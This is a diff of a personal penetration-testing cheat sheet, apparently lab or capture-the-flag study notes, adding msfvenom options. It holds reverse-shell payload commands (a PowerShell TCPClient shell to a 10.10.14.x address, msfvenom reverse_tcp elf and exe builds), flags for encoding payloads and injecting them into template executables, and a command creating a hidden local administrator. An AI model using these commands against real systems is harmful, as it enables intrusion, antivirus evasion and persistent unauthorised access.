@@ -290,10 +290,23 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 
 
 ### Payloas with MSFvenom
+- msfvenom
+  - -a ARCH
+  - -p PLATFORM
+  - -p payload
+  - -b --bad-chars "\x00" enconding
+  - -f --format FORMAT output (exe, php, aspx, raw, elf ...) 
+  - -e x86/shikata_ga_nai
+  - -i iterration
+  - -x /path/to/template.exe = use this file as template
+  - -k keep template behaviour + inject payload
+  - Encrypted payload with password
+    - rar + remove extension
+
 - List payloads
   - msfvenom -l payloads | encoders | nos | platforms | formats | all
   - -p payload --list-options
-- Many platforms and formats
+
 - Example generate hex of payload:
   - Method 1
     - msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
@@ -305,9 +318,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
     - msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT -f elf > payload.elf
     - msfvenom -p  windows/shell_reverse_tcp LHOST= LPORT -f exe > payload.exe
 
-- [Stage vs Stageless](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
-  - stageless: shell_reverse_tcp = one thing only
-  - staged: /shell/reverse_tcp
+- Metasploit
+  - 
 
 - Smaller payloads
   - Payload with a single command: **CMD='net user pwnd Password321 /add;net localgroup administrators pwdn /add'**
